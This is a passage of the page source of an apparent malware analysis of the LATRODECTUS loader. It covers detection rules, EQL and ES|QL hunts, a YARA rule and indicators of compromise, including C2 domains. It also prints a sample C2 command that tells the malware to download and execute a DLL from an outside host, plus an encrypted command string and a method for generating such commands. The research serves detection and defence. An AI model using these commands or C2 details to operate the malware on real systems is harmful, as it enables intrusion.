sandboxed\",width:\"1227\",height:\"389\"})}),`\n`,(0,n.jsx)(e.p,{children:\"As an example, for the download and execution of a DLL (handler #13), we can provide the following request structure (object type, handler, arguments for handler) to the command dispatcher:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`COMMAND|13|http://www.meow123.com/dll, ShowMessage\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"The following example depicts the RC4-encrypted string described earlier, which has been base64-encoded.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`E3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU=\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Using the following CyberChef recipe, analysts can generate encrypted command requests:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image1.png\",alt:\"Example with DLL Execution handler via CyberChef\",width:\"1208\",height:\"335\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Using the actual malware codebase and executing these different handlers using a low-risk framework, defenders can get a glimpse into the events, alerts, and logs recorded by their security instrumentation.\"}),`\n`,(0,n.jsx)(e.h2,{id:\"detecting-latrodectus\",children:\"Detecting LATRODECTUS\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following Elastic Defend protection features trigger during the LATRODECTUS malware infection process:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image5.png\",alt:\"Elastic Defend alerts against LATRODECTUS\",width:\"1440\",height:\"653\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Below are the prebuilt MITRE ATT\u0026CK-aligned rules with descriptions:\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"ATT\u0026CK technique\"}),(0,n.jsx)(e.th,{children:\"Elastic Rule\"}),(0,n.jsx)(e.th,{children:\"Description\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsxs)(e.td,{children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_oversized_windows_script_execution.toml\",rel:\"nofollow\",children:\"T1059.007 - Javascript\"}),\" \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1027/\",rel:\"nofollow\",children:\"T1027 - Obfuscated Files or Information\"})]}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml\",rel:\"nofollow\",children:\"Suspicious Oversized Script Execution\"})}),(0,n.jsx)(e.td,{children:\"LATRODECTUS is delivered via oversized Javascript files, on average more than 800KB filled with random text.\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1047/\",rel:\"nofollow\",children:\"T1047 - Windows Management Instrumentation\"})}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml\",rel:\"nofollow\",children:\"Execution via a Suspicious WMI Client\"})}),(0,n.jsx)(e.td,{children:\"Javascript dropper invokes WMI to mount a WEBDAV share and invokes msiexec to install a remote msi file.\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1218/007/\",rel:\"nofollow\",children:\"T1218.007 - Misexec\"})}),(0,n.jsxs)(e.td,{children:[(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_remote_file_execution_via_msiexec.toml\",rel:\"nofollow\",children:\"Remote File Execution via MSIEXEC\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_suspicious_msiexec_child_process.toml\",rel:\"nofollow\",children:\"Suspicious MsiExec Child Process\"})]}),(0,n.jsx)(e.td,{children:\"MSI file hosted on remote Webdav and executed in quiet mode. Once executed it drops a DLL and launches rundll32 to load it via the Advanced installer viewer.exe binary.\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1218/011/\",rel:\"nofollow\",children:\"T1218.011 - Rundll32\"})}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml\",rel:\"nofollow\",children:\"Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory\"})}),(0,n.jsx)(e.td,{children:\"Rundll32 loads the LATRODECTUS DLL from AppData and starts code injection.\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1055/\",rel:\"nofollow\",children:\"T1055 - Process Injection\"})}),(0,n.jsxs)(e.td,{children:[(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html#memory-protection\",rel:\"nofollow\",children:\"Memory Threat Detection Alert: Shellcode Injection\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml\",rel:\"nofollow\",children:\"VirtualProtect API Call from an Unsigned DLL\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml\",rel:\"nofollow\",children:\"Shellcode Execution from Low Reputation Module\"}),\" \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml\",rel:\"nofollow\",children:\"Network Module Loaded from Suspicious Unbacked Memory\"})]}),(0,n.jsx)(e.td,{children:\"Shellcode execution triggers 3 endpoint behavior alerts and a memory threat detection alert.\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/005/\",rel:\"nofollow\",children:\"T1053.005 - Scheduled Task\"})}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml\",rel:\"nofollow\",children:\"Scheduled Task Creation by an Unusual Process\"})}),(0,n.jsx)(e.td,{children:\"LATRODECTUS may persist using scheduled tasks (rundll32 will create a scheduled task).\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1070/004/\",rel:\"nofollow\",children:\"T1070.004 - File Deletion\"})}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml\",rel:\"nofollow\",children:\"Potential Self Deletion of a Running Executable\"})}),(0,n.jsxs)(e.td,{children:[\"Part of the malware DLL self update command and also when the DLL is not running from AppData, LATRODECTUS will delete itself while running and restart from the new path or running an updated version of itself leveraging \",(0,n.jsx)(e.a,{href:\"https://github.com/LloydLabs/delete-self-poc\",rel:\"nofollow\",children:\"this technique\"}),\".\"]})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1059/003/\",rel:\"nofollow\",children:\"T1059.003 - Windows Command Shell\"})}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml\",rel:\"nofollow\",children:\"Command Shell Activity Started via RunDLL32\"})}),(0,n.jsx)(e.td,{children:\"LATRODECTUS Command ID (4) - Collect system information via a series of cmd.exe execution.\"})]})]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"The following list of hunts and detection queries can be used to detect LATRODECTUS post-exploitation commands focused on execution:\"}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.strong,{children:\"Rundll32 Download PE/DLL\"}),\" (command handlers #12, #13 and #18):\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-sql\",children:`sequence by process.entity_id with maxspan=1s\n[file where event.action == \"creation\" and process.name : \"rundll32.exe\" and \n /* PE file header dropped to the InetCache folder */\nfile.Ext.header_bytes : \"4d5a*\" and file.path : \"?:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\INetCache\\\\\\\\IE\\\\\\\\*\"]\n[network where process.name : \"rundll32.exe\" and \n   event.action : (\"disconnect_received\", \"connection_attempted\") and \n   /* network disconnect activity to a public Ip address */\n   not cidrmatch(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\", \"FE80::/10\", \"FF00::/8\", \"192.168.0.0/16\")]\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image8.png\",alt:\"EQL Query using hunt detecting LATRODECTUS\",width:\"1440\",height:\"720\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Below is an ES|QL hunt to look for long-term and/or high count of network connections by rundll32 to a public IP address (which is uncommon):\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-sql\",children:`from logs-endpoint.events.network-*\n| where host.os.family == \"windows\" and event.category == \"network\" and\n network.direction == \"egress\" and process.name == \"rundll32.exe\" and\n/* excluding private IP ranges */\n not CIDR_MATCH(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.168.0.0/16\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\",\"FE80::/10\", \"FF00::/8\")\n| keep source.bytes, destination.address, process.name, process.entity_id, process.pid, @timestamp, host.name\n/* calc total duration and the number of connections per hour */\n| stats count_connections = count(*), start_time = min(@timestamp), end_time = max(@timestamp) by process.entity_id, process.pid, destination.address, process.name, host.name\n| eval duration = TO_DOUBLE(end_time)-TO_DOUBLE(start_time), duration_hours=TO_INT(duration/3600000), number_of_con_per_hour = (count_connections / duration_hours)\n| keep host.name, destination.address, process.name, process.pid, duration, duration_hours, number_of_con_per_hour, count_connections\n| where count_connections \u003e= 100\n`})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image3.png\",alt:\"ES|QL Query using hunt detecting LATRODECTUS\",width:\"1440\",height:\"612\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Below is a screenshot of Elastic Defend triggering on the LATRODECTUS \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar\",rel:\"nofollow\",children:\"memory signature\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image23.png\",alt:\"Memory signatures against LATRODECTUS via Elastic Defend\",width:\"1440\",height:\"495\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"yara\",children:\"YARA\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Elastic Security has created YARA rules to identify \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar\",rel:\"nofollow\",children:\"LATRODECTUS\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`rule Windows_Trojan_LATRODECTUS_841ff697 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-03-13\"\n        last_modified = \"2024-04-05\"\n        license = \"Elastic License v2\"\n         os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.LATRODECTUS\"\n        reference_sample = \"aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c\"\n\n\n    strings:\n        $Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }\n        $crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }\n        $delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }\n        $Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }\n        $handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }\n        $hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }\n        $string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }\n        $campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }\n    condition:\n        2 of them\n}\n`})}),`\n`,(0,n.jsx)(e.h2,{id:\"observations\",children:\"Observations\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following observables were discussed in this research.\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Observable\"}),(0,n.jsx)(e.th,{children:\"Type\"}),(0,n.jsx)(e.th,{children:\"Name\"}),(0,n.jsx)(e.th,{children:\"Reference\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c\"}),(0,n.jsx)(e.td,{children:\"SHA-256\"}),(0,n.jsx)(e.td,{children:\"TRUFOS.DLL\"}),(0,n.jsx)(e.td,{children:\"LATRODECTUS\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"aytobusesre.com\"}),(0,n.jsx)(e.td,{children:\"domain\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"LATRODECTUS C2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"scifimond.com\"}),(0,n.jsx)(e.td,{children:\"domain\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"LATRODECTUS C2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"gyxplonto.com\"}),(0,n.jsx)(e.td,{children:\"domain\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"ICEDID C2\"})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"neaachar.com\"}),(0,n.jsx)(e.td,{children:\"domain\"}),(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:\"ICEDID C2\"})]})]})]})}),`\n`,(0,n.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,n.jsx)(e.p,{children:\"The following were referenced throughout the above research:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39\",rel:\"nofollow\",children:\"https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice\",rel:\"nofollow\",children:\"https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice\"})}),`\n`]}),`\n`,(0,n.jsx)(e.h2,{id:\"tooling\",children:\"Tooling\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py\",rel:\"nofollow\",children:\"String decryption and IDA commenting tool\"})})]})}function C(i={}){let{wrapper:e}=i.components||{};return e?(0,n.jsx)(e,Object.assign({},i,{children:(0,n.jsx)(c,i)})):c(i)}var T=C;return y(v);})();\n;return Component;"},"_id":"articles/spring-cleaning-with-latrodectus.mdx","_raw":{"sourceFilePath":"articles/spring-cleaning-with-latrodectus.mdx","sourceFileName":"spring-cleaning-with-latrodectus.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/spring-cleaning-with-latrodectus"},"type":"Article","imageUrl":"/assets/images/spring-cleaning-with-latrodectus/Security Labs Images 16.jpg","readingTime":"24 min read","series":"","url":"/spring-cleaning-with-latrodectus","headings":[{"level":2,"title":"LATRODECTUS at a glance","href":"#latrodectus-at-a-glance"},{"level":3,"title":"Key takeaways","href":"#key-takeaways"},{"level":3,"title":"LATRODECTUS campaign overview","href":"#latrodectus-campaign-overview"},{"level":2,"title":"LATRODECTUS analysis","href":"#latrodectus-analysis"},{"level":3,"title":"String obfuscation ","href":"#string-obfuscation-"},{"level":3,"title":"Runtime API","href":"#runtime-api"},{"level":3,"title":"Anti-analysis","href":"#anti-analysis"},{"level":3,"title":"Mutex","href":"#mutex"},{"level":3,"title":"Hardware ID","href":"#hardware-id"},{"level":3,"title":"Campaign ID","href":"#campaign-id"},{"level":3,"title":"Setup / persistence","href":"#setup--persistence"},{"level":3,"title":"Self-deletion","href":"#self-deletion"},{"level":3,"title":"Communication","href":"#communication"},{"level":3,"title":"Bot Functionality","href":"#bot-functionality"},{"level":4,"title":"Desktop listing - command ID (2)","href":"#desktop-listing---command-id-2"},{"level":4,"title":"Process ancestry - command ID (3)","href":"#process-ancestry---command-id-3"},{"level":4,"title":"Collect system information - command ID (4)","href":"#collect-system-information---command-id-4"},{"level":4,"title":"Download and execute PE - command ID (12)","href":"#download-and-execute-pe---command-id-12"},{"level":4,"title":"Download and execute DLL - command ID (13)","href":"#download-and-execute-dll---command-id-13"},{"level":4,"title":"Download and execute shellcode - command (14)","href":"#download-and-execute-shellcode---command-14"},{"level":4,"title":"Update / restart  - command ID (15)","href":"#update--restart----command-id-15"},{"level":4,"title":"Terminate - command ID (17)","href":"#terminate---command-id-17"},{"level":4,"title":"Download and execute hosted ICEID payload - command ID (18)","href":"#download-and-execute-hosted-iceid-payload---command-id-18"},{"level":4,"title":"Beacon timeout - command ID (19)","href":"#beacon-timeout---command-id-19"},{"level":4,"title":"Reset counter - command ID (20)","href":"#reset-counter---command-id-20"},{"level":3,"title":"LATRODECTUS / ICEDID connection","href":"#latrodectus--icedid-connection"},{"level":3,"title":"Sandboxing LATRODECTUS","href":"#sandboxing-latrodectus"},{"level":2,"title":"Detecting LATRODECTUS","href":"#detecting-latrodectus"},{"level":3,"title":"YARA","href":"#yara"},{"level":2,"title":"Observations","href":"#observations"},{"level":2,"title":"References","href":"#references"},{"level":2,"title":"Tooling","href":"#tooling"}],"author":[{"title":"Daniel Stepanic","slug":"daniel-stepanic","description":"Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),g=(t,n)=\u003e{for(var e in n)i(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of p(n))!f.call(t,a)\u0026\u0026a!==e\u0026\u0026i(t,a,{get:()=\u003en[a],enumerable:!(o=x(n,a))||o.enumerable});return t};var j=(t,n,e)=\u003e(e=t!=null?m(d(t)):{},s(n||!t||!t.__esModule?i(e,\"default\",{value:t,enumerable:!0}):e,t)),D=t=\u003es(i({},\"__esModule\",{value:!0}),t);var u=_((h,c)=\u003e{c.exports=_jsx_runtime});var X={};g(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=j(u()),M={title:\"Daniel Stepanic\",description:\"Elastic\",slug:\"daniel-stepanic\"};function l(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(l,t)})):l(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"authors/daniel-stepanic.mdx","_raw":{"sourceFilePath":"authors/daniel-stepanic.mdx","sourceFileName":"daniel-stepanic.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/daniel-stepanic"},"type":"Author","imageUrl":"","url":"/authors/daniel-stepanic"},{"title":"Samir Bousseaden","slug":"samir-bousseaden","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)s(t,n,{get:e[n],enumerable:!0})},u=(t,e,n,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of f(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=d(e,o))||a.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(_(t)):{},u(e||!t||!t.__esModule?s(n,\"default\",{value:t,enumerable:!0}):n,t)),M=t=\u003eu(s({},\"__esModule\",{value:!0}),t);var m=j((h,i)=\u003e{i.exports=_jsx_runtime});var F={};l(F,{default:()=\u003eD,frontmatter:()=\u003eb});var r=p(m()),b={title:\"Samir Bousseaden\",slug:\"samir-bousseaden\"};function c(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(c,t)})):c(t)}var D=C;return M(F);})();\n;return Component;"},"_id":"authors/samir-bousseaden.mdx","_raw":{"sourceFilePath":"authors/samir-bousseaden.mdx","sourceFileName":"samir-bousseaden.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/samir-bousseaden"},"type":"Author","imageUrl":"","url":"/authors/samir-bousseaden"}],"category":[{"title":"Malware analysis","slug":"malware-analysis","body":{"raw":"","code":"var Component=(()=\u003e{var u=Object.create;var s=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),M=(t,n)=\u003e{for(var e in n)s(t,e,{get:n[e],enumerable:!0})},i=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!g.call(t,r)\u0026\u0026r!==e\u0026\u0026s(t,r,{get:()=\u003en[r],enumerable:!(o=x(n,r))||o.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?u(_(t)):{},i(n||!t||!t.__esModule?s(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var l=j((X,c)=\u003e{c.exports=_jsx_runtime});var D={};M(D,{default:()=\u003eC,frontmatter:()=\u003ew});var a=d(l()),w={title:\"Malware analysis\",slug:\"malware-analysis\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function y(t={}){let{wrapper:n}=t.components||{};return n?(0,a.jsx)(n,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=y;return p(D);})();\n;return Component;"},"_id":"categories/malware-analysis.mdx","_raw":{"sourceFilePath":"categories/malware-analysis.mdx","sourceFileName":"malware-analysis.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/malware-analysis"},"type":"Category","url":"/categories/malware-analysis"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"spring-cleaning-with-latrodectus"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>